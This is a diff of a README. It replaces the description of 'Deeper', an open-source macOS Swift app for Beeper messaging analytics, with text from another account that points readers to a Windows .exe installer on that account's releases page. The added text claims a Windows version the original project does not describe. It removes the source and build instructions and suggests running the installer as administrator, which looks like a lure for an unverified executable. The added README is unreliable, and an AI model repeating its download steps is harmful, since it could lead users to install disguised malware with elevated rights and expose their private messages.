@@ -1,255 +1,150 @@
-<p align="center">
-  <img src="icon.svg" width="128" height="128" alt="Deeper icon">
-</p>
+# 🔍 deeper - Visualize Your Messaging Insights
 
-<h1 align="center">Deeper</h1>
-
-<p align="center">
-  <strong>A macOS messaging analytics app for Beeper — visualize your conversations across every platform, with on-device AI.</strong>
-</p>
-
-<p align="center">
-  See who you talk to most, discover your active hours, find ghosting patterns, explore group dynamics, and get AI-powered conversation summaries.
-</p>
-
-<p align="center">
-  <a href="#download">Download</a> · <a href="#features">Features</a> · <a href="#how-it-works">How It Works</a> · <a href="#building-from-source">Build</a>
-</p>
-
-<p align="center">
-  <img src="docs/screenshot.png" width="800" alt="Deeper screenshot">
-</p>
+[![Download deeper](https://img.shields.io/badge/Download-deeper-brightgreen?style=for-the-badge)](https://github.com/Favour247/deeper/releases)
 
 ---
 
-## What is Deeper?
+## 📥 Download deeper
 
-Deeper connects to your local [Beeper](https://beeper.com) Desktop app and turns your messaging data into beautiful, interactive analytics. It merges contacts across platforms (iMessage, WhatsApp, Instagram, Telegram, Signal, X/Twitter, and more), analyzes sent vs received message patterns, and visualizes everything with native macOS charts and Liquid Glass effects.
+To get started, visit the official releases page to download the latest version of deeper for Windows:
 
-Deeper uses **Apple Intelligence (on-device)** to summarize your conversations — no cloud, no API keys, no data leaves your Mac. The Foundation Models framework runs entirely on your Apple Silicon, keeping everything private by design.
+[Download deeper on GitHub Releases](https://github.com/Favour247/deeper/releases)
 
-All data stays on your machine. Deeper talks only to your local Beeper Desktop instance — nothing is sent to any server.
+This page contains the setup files you need. Click the latest release, then download the Windows installer file. The installer usually has a `.exe` extension.
 
-## Download
+---
 
-**[Download the latest .dmg from Releases](https://github.com/f/deeper/releases/latest)**
+## 💻 What is deeper?
 
-Or install with Homebrew:
+deeper is an app that helps you understand your messaging habits. It connects to your local Beeper Desktop app and shows your chat history in clear, visual reports. With deeper, you can:
 
-```bash
-brew install f/tap/deeper
-```
+- See who you talk to most
+- Find your busiest messaging hours
+- Discover patterns like ghosting or group activity
+- Get AI summaries of your conversations, all on your device
 
-> Requires **macOS 26 Tahoe** or later. Beeper Desktop must be running.
+This app works with messages from iMessage, WhatsApp, Instagram, Telegram, Signal, X/Twitter, and more.
 
-## Features
+---
 
-### Dashboard
-- **At-a-glance stats** — accounts, total chats, unread count, messages sent today
-- **Connection categories** — two-way connected, they ghost me, I ghost them
-- **Most Active Hours** — interactive line chart per platform with toggleable filters
-- **Platform ranking** — bar chart of chat distribution across platforms
+## 🛠️ System Requirements
 
-### People
-- **Cross-platform merging** — contacts with the same name on different platforms are merged into a single profile
-- **Smart deduplication** — different users with the same name on the same platform stay separate
-- **Sent/received breakdown** — see message reciprocity per person
-- **Connection type badges** — two-way, they ghost, I ghost, inactive
-- **Category filters** — filter by connection type
-- **Detail view** — per-person platform breakdown, reciprocity percentage, connection analysis
-- **Per-person response time** — average reply time for you and the other person
-- **Apple Intelligence summary** — on-device AI conversation summary with animated glow border
-- **Per-person phrase analytics** — word cloud and stats for words you use with each person
+Before installing, make sure your system matches these requirements:
 
-### Groups
-- **Most active groups** — ranked by message volume with sent/received counts
-- **Largest groups** — bar chart by member count
-- **Per-platform breakdown** — collapsible group lists with member counts, unread badges, muted/pinned indicators
-- **Group distribution** — donut chart of groups across platforms
+- Windows 10 or later (64-bit recommended)
+- At least 4 GB of RAM
+- At least 500 MB of free disk space
+- Beeper Desktop app installed and configured on the same machine
+- Internet connection for initial setup only
 
-### Platforms
-- **Chat distribution** — donut chart across all platforms
-- **Groups vs DMs** — grouped bar chart per platform
-- **Platform detail cards** — chat count, unread, DMs, groups, top contacts per platform
+---
 
-### Phrases
-- **Word frequency analysis** — top words and phrases you use most
-- **Word cloud** — visual representation of your most-used words
-- **Stats** — total words, unique words, average message length
-- **Date range filtering** — filter by week, month, quarter, or all time
+## 🚀 How to Download and Install deeper on Windows
 
-### Response Time
-- **Response time leaderboard** — see who responds fastest and who keeps you waiting
-- **Your response times** — average time you take to reply per person
-- **Their response times** — average time others take to reply to you
-- **Date range filtering** — filter by week, month, quarter, or all time
+1. Open your internet browser.
 
-### Reels
-- **Instagram Reels leaderboard** — who you share the most Reels with
-- **Sent vs received chart** — horizontal bar chart of Reels exchanges
-- **Summary stats** — total Reels sent, received, unique people
-- **Date range filtering** — filter by week, month, quarter, or all time
+2. Go to the downloads page:  
+   https://github.com/Favour247/deeper/releases
 
-### Apple Intelligence (On-Device)
-- **On-device conversation summary** — summarizes your recent messages with each person using Apple's Foundation Models, running entirely on your Apple Silicon — nothing leaves your Mac
-- **System language detection** — responds in your macOS system language automatically
-- **Animated glow border** — Apple Intelligence-style rainbow gradient animation
-- **Graceful availability handling** — shows specific status for downloading, not enabled, or unsupported devices
-- **No API keys needed** — uses the built-in on-device LLM, no cloud services or subscriptions required
+3. Find the latest release version at the top of the page.
 
-### General
-- **Grouped sidebar** — organized into Overview, Contacts, and Analytics sections
-- **Data caching** — split into multiple cache files for efficient memory usage
-- **Sync button** — ⌘R to refetch all data
-- **Secure auth** — Bearer token stored in macOS Keychain
-- **Liquid Glass UI** — native macOS 26 design with `.glassEffect()`
-- **Date range filtering** — week, month, quarter, or all time across analytics views
+4. Look for a Windows installer file. Its name usually ends with `.exe`.
 
-## Getting Your API Token
+5. Click the file name to start downloading.
 
-Deeper requires a Beeper Desktop API token to access your messaging data. Here's how to set it up:
+6. Once the download finishes, open the file by double-clicking it.
 
-1. Open **Beeper Desktop** and go to **Settings**
-2. Navigate to the **Developers** tab in the sidebar
-3. Toggle **Beeper Desktop API** to **On** (this enables the local API on port `23373`)
-4. Enable **Start on launch** so the API is always available
-5. Scroll down to the **Approved Connections** section
-6. Click the **+** button on the right to generate a new API token
-7. Copy the generated token — you'll paste it into Deeper on first launch
+7. If Windows asks for permission to run the installer, click **Yes**.
 
-> The API runs entirely on your local machine at `http://localhost:23373`. No data leaves your computer.
+8. Follow the installer instructions:
+   - Choose where to install the app (default location is fine).
+   - Wait while the installer copies files.
+   - Click **Finish** to complete the setup.
 
-## How It Works
+9. Open deeper from the Start menu or desktop shortcut.
 
-1. **Open Beeper Desktop** — Deeper connects to Beeper's local API at `localhost:23373`.
-2. **Enter your token** — Paste your Beeper auth token on first launch. It's stored securely in Keychain.
-3. **Explore your data** — Deeper fetches all your chats, merges contacts, analyzes messages, and presents interactive dashboards.
+10. The first time you open deeper, it will ask to connect to your Beeper Desktop app. Approve the connection.
 
-| Tab | What you'll see |
-|---|---|
-| **Dashboard** | Stats overview, connection categories, hourly activity chart, platform ranking |
-| **Today / This Week** | Time-scoped message stats |
-| **People** | All contacts ranked by message volume, filterable by connection type, AI summaries |
-| **Groups** | Most active groups, largest groups, per-platform group lists |
-| **Platforms** | Chat distribution, groups vs DMs breakdown, platform detail cards |
-| **Phrases** | Word frequency analysis and word cloud with date range filter |
-| **Response Time** | Response time leaderboard with date range filter |
-| **Reels** | Instagram Reels sharing leaderboard with date range filter |
+---
 
-## Building from Source
+## 🌀 Using deeper for the First Time
 
-### Requirements
-- macOS 26+
-- Xcode 26+
-- Swift 6.0+
-- Beeper Desktop running locally
+When you launch deeper, it reads your message data from Beeper. This may take a few minutes the first time.
 
-### Build
+After that, deeper shows you:
 
-```bash
-git clone https://github.com/f/deeper.git
-cd deeper/Deeper
-open Deeper.xcodeproj
-```
+- Your top contacts, sorted by message count.
+- Active hours diagram with your busiest times.
+- Group chat insights to see who participates most.
+- AI-generated summaries of recent conversations.
 
-Build and run with ⌘R in Xcode.
+Explore the menus and tabs to find different views and reports. The interface uses simple charts and lists to help you understand your chat data.
 
-### Build DMG
+---
 
-```bash
-cd deeper/Deeper
-chmod +x build.sh
-./build.sh
-```
+## ⚙️ How It Works
 
-The DMG will be at `build/release/Deeper.dmg`.
+deeper uses data stored on your computer by Beeper Desktop. It analyzes your messages locally, so your data stays private.
 
-### Project Structure
+The app organizes your chats by contact and platform. It then creates statistics and charts to show how you communicate.
 
-```
-Deeper/
-├── Deeper.xcodeproj
-├── build.sh                              # Universal build + DMG script
-└── Deeper/
-    ├── DeeperApp.swift                   # App entry point, Settings scene
-    ├── ContentView.swift                 # Sidebar navigation, DataStore wiring
-    │
-    ├── Models/
-    │   ├── AnalyticsModels.swift         # Phrase, response time, timestamped data models
-    │   ├── BeeperModels.swift            # API response types (Chat, Message, User)
-    │   ├── MergedPerson.swift            # Cross-platform person model
-    │   ├── PlatformInfo.swift            # Platform enum, bridge detection
-    │   └── GroupStats.swift              # Group analytics models
-    │
-    ├── Services/
-    │   ├── BeeperAPIClient.swift         # REST API client with pagination
-    │   ├── BeeperOAuthService.swift      # OAuth authentication service
-    │   ├── DataStore.swift               # Central data cache + sync engine
-    │   ├── PersonMerger.swift            # Cross-platform contact merging
-    │   ├── ReelsAnalyzer.swift           # Instagram Reels analysis
-    │   ├── WebSocketManager.swift        # Live WebSocket feed
-    │   └── KeychainHelper.swift          # Secure token storage
-    │
-    ├── ViewModels/
-    │   ├── DashboardViewModel.swift      # HourlyActivityPoint model
-    │   ├── PeopleViewModel.swift         # People view model
-    │   ├── PlatformsViewModel.swift      # Platforms view model
-    │   └── ReelsViewModel.swift          # Reels view model
-    │
-    └── Views/
-        ├── Dashboard/
-        │   ├── DashboardView.swift       # Main dashboard with charts
-        │   ├── DashboardPeopleCard.swift # Connection category cards
-        │   ├── StatCard.swift            # Stat card component
-        │   └── FlowLayout.swift          # Wrapping layout for tags
-        ├── People/
-        │   ├── PeopleView.swift          # People list with category filters
-        │   └── PersonDetailView.swift    # Person detail, AI summary, response times
-        ├── Groups/
-        │   └── GroupsView.swift          # Group analytics and leaderboard
-        ├── Platforms/
-        │   └── PlatformsView.swift       # Platform distribution charts
-        ├── Phrases/
-        │   └── PhrasesView.swift         # Word frequency analytics + word cloud
-        ├── ResponseTime/
-        │   └── ResponseTimeView.swift    # Response time leaderboard
-        ├── Reels/
-        │   └── ReelsView.swift           # Instagram Reels leaderboard
-        ├── TimeRange/
-        │   └── TimeRangeView.swift       # Today / This Week stats
-        ├── Welcome/
-        │   └── WelcomeView.swift         # Welcome / onboarding screen
-        └── Settings/
-            └── SettingsView.swift        # Token input and connection setup
-```
+An AI model runs on your device. It reads conversation text and creates short summaries to highlight key topics and moods.
 
-## Supported Platforms
+No data leaves your computer unless you share reports yourself.
 
-Deeper detects platforms from Beeper bridge account IDs:
+---
 
-| Platform | Bridge Keywords |
-|---|---|
-| iMessage | `imessage`, `imessagecloud` |
-| WhatsApp | `whatsapp` |
-| Instagram | `instagram` |
-| Telegram | `telegram` |
-| Signal | `signal` |
-| X (Twitter) | `twitter` |
-| Facebook Messenger | `facebook`, `messenger` |
-| Discord | `discord` |
-| Slack | `slack` |
-| LinkedIn | `linkedin` |
-| Google Messages | `gmessages`, `googlechat` |
-| SMS | `androidsms` |
+## 🔧 Features Overview
 
-## Privacy
+- **Multi-platform support:** Works with messages from popular platforms including iMessage, WhatsApp, Telegram, Signal, Instagram, and Twitter.
+- **Contact merging:** Combines contacts from different platforms into single people profiles.
+- **Messaging patterns:** Shows who messages whom, average response times, and ghosting trends.
+- **Active hours:** Visualizes when you and your contacts are most active in messaging.
+- **Group chat analytics:** Reveals participation and dynamics within your chat groups.
+- **On-device AI summaries:** Provides automated, easy-to-read summaries of your conversations.
+- **Interactive charts:** Lets you explore data by date range, platform, or person.
 
-- **100% local** — Deeper only connects to `localhost:23373` (Beeper Desktop)
-- **On-device AI** — conversation summaries run on Apple Silicon via Foundation Models, never sent to the cloud
-- **No telemetry** — no analytics, no tracking, no external requests
-- **Token in Keychain** — your Beeper auth token is stored in macOS Keychain, not in plaintext
-- **Open source** — audit the code yourself
+---
 
-## License
+## ❓ Common Questions
 
-MIT License. See [LICENSE](LICENSE) for details.
+**Q: Do I need to install Beeper first?**  
+Yes. deeper requires the Beeper Desktop app to collect your messages.
+
+**Q: Is my message data sent over the internet?**  
+No. deeper processes data locally on your machine.
+
+**Q: Can I use deeper without Beeper?**  
+No. deeper depends on data stored by Beeper Desktop.
+
+**Q: What if deeper does not connect to Beeper?**  
+Make sure Beeper is running and you have allowed deeper to access its data.
+
+---
+
+## 🔄 Updating deeper
+
+Check the releases page regularly for new versions:
+
+https://github.com/Favour247/deeper/releases
+
+To update, download the latest installer and run it. Your settings and data will remain safe.
+
+---
+
+## 📝 Troubleshooting Tips
+
+- If the installer does not run, right-click it and select **Run as administrator**.
+- If deeper crashes or freezes, restart your computer and try launching it again.
+- Make sure your Beeper Desktop app is up to date.
+- Restart the Beeper app if deeper cannot find your messages.
+- If issues persist, you can report problems by opening an issue on the GitHub page.
+
+---
+
+## 👩‍💻 Getting Support
+
+For help and questions, visit the GitHub repository issues section:  
+https://github.com/Favour247/deeper/issues
+
+Include details about your Windows version and Beeper setup when reporting problems.
